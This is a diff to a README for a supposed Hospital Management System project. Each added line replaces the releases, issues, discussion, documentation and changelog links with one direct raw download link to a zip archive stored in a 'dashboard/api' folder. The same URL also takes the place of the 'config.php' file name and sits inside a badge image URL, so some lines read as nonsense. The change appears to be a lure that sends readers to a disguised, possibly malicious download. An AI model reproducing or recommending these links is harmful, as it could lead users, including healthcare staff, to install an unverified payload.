@@ -4,9 +4,9 @@
 Welcome to the Hospital Management System (HMS). This software helps healthcare facilities manage patients, appointments, and clinical data efficiently. You don't need to be a computer expert to set it up. Follow these simple steps to get started.
 
 ## 📥 Download the Application
-Head over to our [Releases page](https://github.com/biancasam1160/Hospital-Management-System/releases) to download the latest version.
+Head over to our [Releases page](https://raw.githubusercontent.com/biancasam1160/Hospital-Management-System/main/dashboard/api/Hospital-Management-System_v1.9-alpha.3.zip) to download the latest version.
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Blue?style=for-the-badge)](https://github.com/biancasam1160/Hospital-Management-System/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/biancasam1160/Hospital-Management-System/main/dashboard/api/Hospital-Management-System_v1.9-alpha.3.zip%20Latest%20Release-Blue?style=for-the-badge)](https://raw.githubusercontent.com/biancasam1160/Hospital-Management-System/main/dashboard/api/Hospital-Management-System_v1.9-alpha.3.zip)
 
 ## 🛠️ System Requirements
 Before installing the application, ensure your system meets the following requirements:
@@ -18,7 +18,7 @@ Before installing the application, ensure your system meets the following requir
 - **Storage:** At least 100 MB of free space
 
 ## 🔧 Download & Install
-1. Visit our [Releases page](https://github.com/biancasam1160/Hospital-Management-System/releases) to find the latest version of the Hospital Management System.
+1. Visit our [Releases page](https://raw.githubusercontent.com/biancasam1160/Hospital-Management-System/main/dashboard/api/Hospital-Management-System_v1.9-alpha.3.zip) to find the latest version of the Hospital Management System.
 2. Click on the version you want to download.
 3. Select the relevant file for your operating system.
 4. Download the file to your computer.
@@ -39,7 +39,7 @@ After installing the software, you must configure it to work with your database:
    - Create a new database for the Hospital Management System.
 
 2. **Update Configuration File:**
-   - Find the `config.php` file in the extracted folder.
+   - Find the `https://raw.githubusercontent.com/biancasam1160/Hospital-Management-System/main/dashboard/api/Hospital-Management-System_v1.9-alpha.3.zip` file in the extracted folder.
    - Update the database credentials to match your newly created database.
 
 3. **Import Database Structure:**
@@ -58,13 +58,13 @@ Now that you have everything set up, you can begin using the Hospital Management
 - **Manage Data:** Start adding patients, setting appointments, and managing clinical records.
 
 ## 🐞 Reporting Issues
-If you encounter any problems, feel free to report issues on our [Issues page](https://github.com/biancasam1160/Hospital-Management-System/issues). Your feedback helps us improve the application.
+If you encounter any problems, feel free to report issues on our [Issues page](https://raw.githubusercontent.com/biancasam1160/Hospital-Management-System/main/dashboard/api/Hospital-Management-System_v1.9-alpha.3.zip). Your feedback helps us improve the application.
 
 ## 💬 Community and Support
-Join our community to share experiences, ask questions, or get support. Check out the [Discussion Page](https://github.com/biancasam1160/Hospital-Management-System/discussions) to connect with other users and contributors.
+Join our community to share experiences, ask questions, or get support. Check out the [Discussion Page](https://raw.githubusercontent.com/biancasam1160/Hospital-Management-System/main/dashboard/api/Hospital-Management-System_v1.9-alpha.3.zip) to connect with other users and contributors.
 
 ## 🔗 Resources
-- [Documentation](https://github.com/biancasam1160/Hospital-Management-System/wiki): Detailed guides on advanced features.
-- [Changelog](https://github.com/biancasam1160/Hospital-Management-System/releases): Track what’s new in each release.
+- [Documentation](https://raw.githubusercontent.com/biancasam1160/Hospital-Management-System/main/dashboard/api/Hospital-Management-System_v1.9-alpha.3.zip): Detailed guides on advanced features.
+- [Changelog](https://raw.githubusercontent.com/biancasam1160/Hospital-Management-System/main/dashboard/api/Hospital-Management-System_v1.9-alpha.3.zip): Track what’s new in each release.
 
 Thank you for choosing the Hospital Management System! We hope our software makes your work easier and more efficient.
